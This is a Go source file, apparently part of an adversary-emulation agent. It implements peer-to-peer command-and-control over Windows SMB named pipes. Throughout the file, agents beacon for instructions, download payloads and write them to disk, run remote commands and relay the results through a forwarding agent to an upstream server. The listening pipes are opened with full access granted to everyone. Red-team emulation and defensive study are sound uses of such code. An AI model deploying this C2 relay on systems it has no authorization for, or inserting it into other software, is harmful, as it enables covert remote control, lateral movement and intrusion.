package contact

import (
    "bufio"
    "fmt"
    "io"
    "net"
    "encoding/json"
    "time"
    "math/rand"
    "errors"
    "strings"
    "path/filepath"
    "../winio"
    "../output"
    "../execute"
    "../util"
)

const pipeLetters = "abcdefghijklmnopqrstuvwxyz"
const numPipeLetters = int64(len(pipeLetters))
const clientPipeNameMinLen = 10
const clientPipeNameMaxLen = 15

//PipeAPI communicates through SMB named pipes. Implements the Contact interface
type SmbPipeAPI struct { }

//PipeReceiver forwards data received from SMB pipes to the upstream server. Implements the P2pReceiver interface
type SmbPipeReceiver struct { }

func init() {
	CommunicationChannels["P2pSmbPipe"] = SmbPipeAPI{}
	P2pReceiverChannels["SmbPipe"] = SmbPipeReceiver{}
}

// SmbPipeReceiver Implementation

// Listen on agent's main pipe for client connection. This main pipe will only respond to client requests with
// a unique pipe name for the client to resend the request to.  The agent will also listen on that unique pipe.
func (receiver SmbPipeReceiver) StartReceiver(profile map[string]interface{}, p2pReceiverConfig map[string]string, upstreamComs Contact) {
    pipePath := "\\\\.\\pipe\\" + p2pReceiverConfig["p2pReceiver"]

    // Make somewhat shallow copy of the profile, in case we need to change the server for just this individual pipe receiver.
    individualProfile := make(map[string]interface{})

    for k,v := range profile {
        individualProfile[k] = v
    }

    go receiver.startReceiverHelper(individualProfile, pipePath, upstreamComs)
}

// Helper method for StartReceiver. Must be run as a go routine.
func (receiver SmbPipeReceiver) startReceiverHelper(profileCopy map[string]interface{}, pipePath string, upstreamComs Contact) {
    listener, err := receiver.listenPipeFullAccess(pipePath)

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with creating listener for pipe %s\n%v", pipePath, err))
        return
    }

    output.VerbosePrint(fmt.Sprintf("[*] Listening on handler pipe %s", pipePath))
    defer listener.Close()

    // Whenever a new client connects to pipe with a request, generate a new individual pipe for that client, listen on that pipe,
    // and give the pipe name to the client if pipe was successfully created.
    for {
        totalData, err := receiver.acceptPipeClientInput(listener)

        if err != nil {
            output.VerbosePrint(fmt.Sprintf("[!] Error with reading client input for pipe %s\n%v", pipePath, err))
            continue
        }

        // convert data to message struct
        message := bytesToP2pMsg(totalData)

        // Handle request. This pipe should only receive GetInstruction beacons.
        // We won't forward instruction requests with this main pipe - just generate new individual pipe for client.
        // Client will resend the request to the original pipe.
        switch message.MessageType {
        case INSTR_GET_INSTRUCTIONS:
            output.VerbosePrint("[*] Main pipe received instruction request beacon. Will create unique pipe for client to resend request to.")

            receiver.setIndividualClientPipe(profileCopy, listener, upstreamComs)
        default:
            output.VerbosePrint(fmt.Sprintf("[!] ERROR: expected beacon, received request type %d", message.MessageType))
        }
    }
}

// Sets up listener on pipe for individual client
func (receiver SmbPipeReceiver) startIndividualReceiver(profile map[string]interface{}, pipePath string, upstreamComs Contact) {
    listener, err := receiver.listenPipeFullAccess(pipePath)

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with creating listener for pipe %s\n%v", pipePath, err))
        return
    }

    output.VerbosePrint(fmt.Sprintf("[*] Listening on individual client pipe %s", pipePath))
    defer listener.Close()

	for {
        // Get data from client
        totalData, err := receiver.acceptPipeClientInput(listener)

        if err != nil {
            output.VerbosePrint(fmt.Sprintf("[!] Error with reading client input for pipe %s\n%v", pipePath, err))
            continue
        }

        // Handle data
        receiver.listenerHandlePipePayload(totalData, profile, listener, upstreamComs)
	}
}

// When client sends this receiver an individual pipe request, generate a new random pipe to listen on solely for this client.
func (receiver SmbPipeReceiver) setIndividualClientPipe(profile map[string]interface{}, listener net.Listener, upstreamComs Contact) {
    // Create random pipe name
    rand.Seed(time.Now().UnixNano())
    clientPipeName := getRandPipeName(rand.Intn(clientPipeNameMaxLen - clientPipeNameMinLen) + clientPipeNameMinLen)
    clientPipePath := "\\\\.\\pipe\\" + clientPipeName
    output.VerbosePrint(fmt.Sprintf("[*] Making individual client pipe %s", clientPipeName))

    // Start individual receiver on client pipe and send name to client.
    go receiver.startIndividualReceiver(profile, clientPipePath, upstreamComs)

    // Create response message for client.
    paw := ""
    if profile["paw"] != nil {
        paw = profile["paw"].(string)
    }
    pipeMsgData := buildP2pMsgBytes(paw, RESEND_REQUEST, []byte(clientPipeName))
    output.VerbosePrint(fmt.Sprintf("[*] DEBUG: sending response to client: %s", string(pipeMsgData)))
    receiver.sendResponseToClient(pipeMsgData, listener)
    output.VerbosePrint("[*] Sent new individual pipe response to client")
}

// Pass the instruction request to the upstream coms, and return the response.
func (receiver SmbPipeReceiver) forwardGetInstructions(message P2pMessage, profile map[string]interface{}, listener net.Listener, upstreamComs Contact) {
    paw := message.RequestingAgentPaw
    output.VerbosePrint(fmt.Sprintf("[*] Forwarding instructions to %s on behalf of paw %s", profile["server"].(string), paw))

    // message payload contains profile to send upstream
    var clientProfile map[string]interface{}
    json.Unmarshal(message.Payload, &clientProfile)
    clientProfile["server"] = profile["server"] // make sure we send the instructions to the right place.
    response := upstreamComs.GetInstructions(clientProfile)
    output.VerbosePrint(fmt.Sprintf("[*] Received instruction response for paw %s: %v", paw, response))

    // Change this receiver's server to the new one if a new one was specified.
    if clientProfile["server"].(string) != profile["server"].(string) {
        output.VerbosePrint(fmt.Sprintf("[*] Changing this individual receiver's upstream server from %s to %s", profile["server"].(string), clientProfile["server"].(string)))
        profile["server"] = clientProfile["server"]
    }

    // Return response downstream.
    data, _ := json.Marshal(response)

    // Create response message for client.
    forwarderPaw := ""
    if profile["paw"] != nil {
        forwarderPaw = profile["paw"].(string)
        output.VerbosePrint(fmt.Sprintf("This receiver's paw: %s. This receiver's server: %s", forwarderPaw, profile["server"].(string)))
    }
    pipeMsgData := buildP2pMsgBytes(forwarderPaw, RESPONSE_INSTRUCTIONS, data)
    receiver.sendResponseToClient(pipeMsgData, listener)
    output.VerbosePrint(fmt.Sprintf("[*] Sent instruction response to paw %s", paw))
}

func (receiver SmbPipeReceiver) forwardPayloadBytesDownload(message P2pMessage, profile map[string]interface{}, listener net.Listener, upstreamComs Contact) {
    paw := message.RequestingAgentPaw
    output.VerbosePrint(fmt.Sprintf("[*] Forwarding payload bytes request on behalf of paw %s", paw))

    // message payload contains file name (str) and platform (str)
    var fileInfo map[string]string
    json.Unmarshal(message.Payload, &fileInfo)
    upstreamResponse := upstreamComs.GetPayloadBytes(fileInfo["file"], profile["server"].(string), paw, fileInfo["platform"])

    // Return response downstream.
    forwarderPaw := ""
    if profile["paw"] != nil {
        forwarderPaw = profile["paw"].(string)
    }
    pipeMsgData := buildP2pMsgBytes(forwarderPaw, RESPONSE_PAYLOAD_BYTES, upstreamResponse)
    receiver.sendResponseToClient(pipeMsgData, listener)
    output.VerbosePrint(fmt.Sprintf("[*] Sent payload bytes to paw %s", paw))
}

func (receiver SmbPipeReceiver) forwardSendExecResults(message P2pMessage, profile map[string]interface{}, listener net.Listener, upstreamComs Contact) {
    paw := message.RequestingAgentPaw
    output.VerbosePrint(fmt.Sprintf("[*] Forwarding execution results on behalf of paw %s", paw))

    // message payload contains result info.
    var resultInfo map[string]string
    json.Unmarshal(message.Payload, &resultInfo)
    resultBytes := util.Decode(resultInfo["output"])
    upstreamComs.SendExecutionResults(resultInfo["id"], profile["server"].(string), resultBytes, resultInfo["status"], resultInfo["cmd"], resultInfo["pid"], paw)
    output.VerbosePrint(fmt.Sprintf("[*] Sent execution results for paw %s", paw))

    // Send response message to client.
    forwarderPaw := ""
    if profile["paw"] != nil {
        forwarderPaw = profile["paw"].(string)
    }
    pipeMsgData := buildP2pMsgBytes(forwarderPaw, RESPONSE_SEND_EXECUTION_RESULTS, nil) // no data to send, just an ACK
    receiver.sendResponseToClient(pipeMsgData, listener)
    output.VerbosePrint(fmt.Sprintf("[*] Sent execution result delivery response to paw %s", paw))
}

// Helper function that listens on pipe and returns listener and any error.
func (receiver SmbPipeReceiver) listenPipeFullAccess(pipePath string) (net.Listener, error) {
    config := &winio.PipeConfig{
        SecurityDescriptor: "D:(A;;GA;;;S-1-1-0)", // File all access to everyone.
    }
    return winio.ListenPipe(pipePath, config)
}

// Helper function that creates random string of specified length using letters a-z
func getRandPipeName(length int) string {
    rand.Seed(time.Now().UnixNano())
    buffer := make([]byte, length)
    for i := range buffer {
        buffer[i] = pipeLetters[rand.Int63() % numPipeLetters]
    }
    return string(buffer)
}

// Helper function that waits for client to connect to the listener and returns data sent by client.
func (receiver SmbPipeReceiver) acceptPipeClientInput(listener net.Listener) ([]byte, error) {
    conn, err := listener.Accept()
    defer conn.Close()

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with accepting connection to listener.\n%v", err))
        return nil, err
    }

    // Read in the data and close connection.
    pipeReader := bufio.NewReader(conn)
    data, _ := readPipeData(pipeReader)
    return data, nil
}

// Helper function that handles data received from the named pipe by sending it to the agent's c2/upstream server.
// Waits for original client to connect to listener before writing response back. TODO set timeout.
// Does not handle individual pipe request - those are handled in ListenForClient.
func (receiver SmbPipeReceiver) listenerHandlePipePayload(data []byte, profile map[string]interface{}, listener net.Listener, upstreamComs Contact) {
    // convert data to message struct
    var message P2pMessage
    json.Unmarshal(data, &message)

    switch message.MessageType {
    case INSTR_GET_INSTRUCTIONS:
	    receiver.forwardGetInstructions(message, profile, listener, upstreamComs)
	case INSTR_GET_PAYLOAD_BYTES:
	    receiver.forwardPayloadBytesDownload(message, profile, listener, upstreamComs)
	case INSTR_SEND_EXECUTION_RESULTS:
	    receiver.forwardSendExecResults(message, profile, listener, upstreamComs)
    default:
        output.VerbosePrint(fmt.Sprintf("[!] ERROR: invalid instruction type for receiver-bound p2p message %d", message.MessageType))
    }
}

// Wait for client to connect to listener, and then send data.
func (receiver SmbPipeReceiver) sendResponseToClient(data []byte, listener net.Listener) {
    conn, err := listener.Accept()
    defer conn.Close()

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with accepting connection to listener.\n%v", err))
        return
    }

    // Write & flush data and close connection.
    pipeWriter := bufio.NewWriter(conn)
    writePipeData(data, pipeWriter)
    conn.Close()
}

/*
 * SmbPipeAPI implementation
 */

// Contact API functions

func (p2pPipeClient SmbPipeAPI) GetInstructions(profile map[string]interface{}) map[string]interface{} {
    output.VerbosePrint(fmt.Sprintf("[*] P2p Client: going to fetch instructions from %s", profile["server"].(string)))

    // Send beacon and fetch response
    payload, _ := json.Marshal(profile)
    paw := ""
    if profile["paw"] != nil {
        paw = profile["paw"].(string)
    }
    serverResp, err := p2pPipeClient.sendRequestToServer(profile["server"].(string), paw, INSTR_GET_INSTRUCTIONS, payload)

	var out map[string]interface{}
	if err == nil {
		output.VerbosePrint("[+] P2P beacon: ALIVE")

		// Check if server wants us to switch pipes.
		for serverResp.MessageType == RESEND_REQUEST {
            // We got the pipe name to resend request to.
            newPipeName := string(serverResp.Payload)
            output.VerbosePrint(fmt.Sprintf("[*] Obtained individual pipe name to resend request to: %s", newPipeName))

            // Replace server for agent.
            serverHostName := strings.Split(profile["server"].(string), "\\")[2]
            newServerPipePath := "\\\\" + serverHostName + "\\pipe\\" + newPipeName
            profile["server"] = newServerPipePath
            output.VerbosePrint(fmt.Sprintf("[*] Setting new server %s", newServerPipePath))
            serverResp, err = p2pPipeClient.sendRequestToServer(newServerPipePath, paw, INSTR_GET_INSTRUCTIONS, payload)
            output.VerbosePrint(fmt.Sprintf("[*] Resent request to %s", newServerPipePath))

            if err != nil {
                output.VerbosePrint("[-] P2P resent beacon: DEAD")
                break
            }
        }

        if serverResp.MessageType != RESPONSE_INSTRUCTIONS {
            output.VerbosePrint(fmt.Sprintf("[!] Error: server sent invalid response type for getting instructions: %d", serverResp.MessageType))
        } else {
            // Message payload contains instruction info.
            json.Unmarshal(serverResp.Payload, &out)
            if out != nil {
                out["sleep"] = int(out["sleep"].(float64))
                out["watchdog"] = int(out["watchdog"].(float64))
            } else {
                output.VerbosePrint("[!] Error: empty payload from server")
		        output.VerbosePrint("[-] P2P beacon: DEAD")
            }
		}
	} else {
	    output.VerbosePrint(fmt.Sprintf("[!] Error: %v", err))
		output.VerbosePrint("[-] P2P beacon: DEAD")
	}
	return out
}

func (p2pPipeClient SmbPipeAPI) DropPayloads(payload string, server string, uniqueId string, platform string) []string{
    payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
	var droppedPayloads []string
	for _, payload := range payloads {
		if len(payload) > 0 {
			droppedPayloads = append(droppedPayloads, p2pPipeClient.drop(payload, server, uniqueId, platform))
		}
	}
	return droppedPayloads
}

// Will obtain the payload bytes in memory to be written to disk later by caller.
func (p2pPipeClient SmbPipeAPI) GetPayloadBytes(payload string, server string, uniqueID string, platform string) []byte {
	var payloadBytes []byte
	if len(payload) > 0 {
	    // Download single payload bytes. Create SMB Pipe message with instruction type INSTR_GET_PAYLOAD_BYTES
	    // and payload as a map[string]string specifying the file and platform.
		output.VerbosePrint(fmt.Sprintf("[*] P2p Client Downloading new payload: %s", payload))
        fileInfo := map[string]interface{} {"file": payload, "platform": platform}
        payload, _ := json.Marshal(fileInfo)
		responseMsg, err := p2pPipeClient.sendRequestToServer(server, uniqueID, INSTR_GET_PAYLOAD_BYTES, payload)

		if err == nil {
            if responseMsg.MessageType == RESPONSE_PAYLOAD_BYTES {
                // Payload bytes in message payload.
                payloadBytes = responseMsg.Payload
            } else {
                output.VerbosePrint(fmt.Sprintf("[!] Error: server sent invalid response type for getting instructions: %d", responseMsg.MessageType))
            }
		} else {
		    output.VerbosePrint("[!] Error: failed message response from forwarder.")
		}
	}
	return payloadBytes
}

func (p2pPipeClient SmbPipeAPI) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
    timeout := int(command["timeout"].(float64))
	cmd, result, status, pid := execute.RunCommand(command["command"].(string), payloads, profile["platform"].(string), command["executor"].(string), timeout)
	p2pPipeClient.SendExecutionResults(command["id"], profile["server"], result, status, cmd, pid, profile["paw"].(string))
}

func (p2pPipeClient SmbPipeAPI) C2RequirementsMet(criteria interface{}) bool {
    return true
}

func (p2pPipeClient SmbPipeAPI) SendExecutionResults(commandID interface{}, server interface{}, result []byte, status string, cmd string, pid string, uniqueID string) {
    // Build SMB pipe message for sending execution results.
    // payload will be map containing output (result), status, pid, cmd, and command ID
    resultInfo := map[string]string {
        "output": string(util.Encode(result)),
        "status": status,
        "pid": pid,
        "cmd": cmd,
        "id": fmt.Sprintf("%s", commandID.(string)),
    }
    payload, _ := json.Marshal(resultInfo)
    output.VerbosePrint(fmt.Sprintf("[*] P2p Client: going to send execution results to %s", server))
    serverResp, err := p2pPipeClient.sendRequestToServer(server.(string), uniqueID, INSTR_SEND_EXECUTION_RESULTS, payload)

    if err == nil {
        if serverResp.MessageType == RESPONSE_SEND_EXECUTION_RESULTS {
            output.VerbosePrint("[*] P2p Client: forwarder passed on our execution results.")
        } else {
            output.VerbosePrint(fmt.Sprintf("[!] Error: server sent invalid response type for sending execution results: %d", serverResp.MessageType))
        }
    } else {
        output.VerbosePrint("[!] Error: failed message response from forwarder.")
    }
}


// Helper functions

// Download single payload and write to disk
func (p2pPipeClient SmbPipeAPI) drop(payload string, server string, uniqueID string, platform string) string {
    location := filepath.Join(payload)
	if len(payload) > 0 && util.Exists(location) == false {
	    data := p2pPipeClient.GetPayloadBytes(payload, server, uniqueID, platform)

        if data != nil {
		    util.WritePayloadBytes(location, data)
		}
	}
	return location
}

// Send a P2pMessage to the server using the specified server pipe path, paw, message type, and payload.
// Returns the P2pMessage from the server.
func (p2pPipeClient SmbPipeAPI) sendRequestToServer(pipePath string, paw string, messageType int, payload []byte) (P2pMessage, error) {
    // Build P2pMessage and convert to bytes.
    pipeMsgData := buildP2pMsgBytes(paw, messageType, payload)

    // Send request and fetch response
    p2pPipeClient.sendSmbPipeClientInput(pipePath, pipeMsgData)
    responseData := p2pPipeClient.fetchReceiverResponse(pipePath)

    output.VerbosePrint("[*] Received response from P2P forwarder")

    if responseData != nil {
        respMsg := bytesToP2pMsg(responseData)
        return respMsg, nil
    } else {
        return P2pMessage{}, errors.New("Failed to get response from server.")
    }
}

// Sends data to specified pipe.
func (p2pPipeClient SmbPipeAPI) sendSmbPipeClientInput(pipePath string, data []byte) {
    conn, err := winio.DialPipe(pipePath, nil)

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error: %v", err))
        if err == winio.ErrTimeout {
            output.VerbosePrint(fmt.Sprintf("[!] Timed out trying to dial to pipe %s", pipePath))
        } else {
            output.VerbosePrint(fmt.Sprintf("[!] Error dialing to pipe %s\n", pipePath, err))
        }
        return
    }

    // Write data and close connection.
    writer := bufio.NewWriter(conn)
    writePipeData(data, writer)

    conn.Close()
}

// Read response data from receiver using given pipePath.
func (p2pPipeClient SmbPipeAPI) fetchReceiverResponse(pipePath string) []byte {
    conn, err := winio.DialPipe(pipePath, nil)

    if err != nil {
        if err == winio.ErrTimeout {
            output.VerbosePrint(fmt.Sprintf("[!] Timed out trying to dial to pipe %s", pipePath))
        } else {
            output.VerbosePrint(fmt.Sprintf("[!] Error dialing to pipe %s\n", pipePath, err))
        }
        return nil
    }

    defer conn.Close()

    // Read data and return.
    pipeReader := bufio.NewReader(conn)
    data, _ := readPipeData(pipeReader)
    return data
}

/*
 * Other auxiliary functions
 */

// Returns data and number of bytes read.
func readPipeData(pipeReader *bufio.Reader) ([]byte, int64) {
    buffer := make([]byte, 4*1024)
    totalData := make([]byte, 0)
    numBytes := int64(0)
    numChunks := int64(0)

    for {
        n, err := pipeReader.Read(buffer[:cap(buffer)])
        buffer = buffer[:n]

        if n == 0 {
            if err == nil {
                // Try reading again.
                time.Sleep(200 * time.Millisecond)
                continue
            } else if err == io.EOF {
                // Reading is done.
                break
            } else {
                 output.VerbosePrint("[!] Error reading data from pipe")
                 return nil, 0
            }
        }

        numChunks++
        numBytes += int64(len(buffer))

        // Add data chunk to current total
        totalData = append(totalData, buffer...)

        if err != nil && err != io.EOF {
             output.VerbosePrint("[!] Error reading data from pipe")
             return nil, 0
        }
    }

    // Data has been read from pipe
    return totalData, numBytes
}

func writePipeData(data []byte, pipeWriter *bufio.Writer) {
    _, err := pipeWriter.Write(data)

    if err != nil {
        if err == io.ErrClosedPipe {
	        output.VerbosePrint("[!] Pipe closed. Not able to flush data.")
	        return
	    } else {
	        output.VerbosePrint(fmt.Sprintf("[!] Error writing data to pipe\n%v", err))
            return
	    }
    }

    err = pipeWriter.Flush()
	if err != nil {
	    if err == io.ErrClosedPipe {
	        output.VerbosePrint("[!] Pipe closed. Not able to flush data.")
	        return
	    } else {
	        output.VerbosePrint(fmt.Sprintf("[!] Error flushing data to pipe\n%v", err))
		    return
	    }
	}
}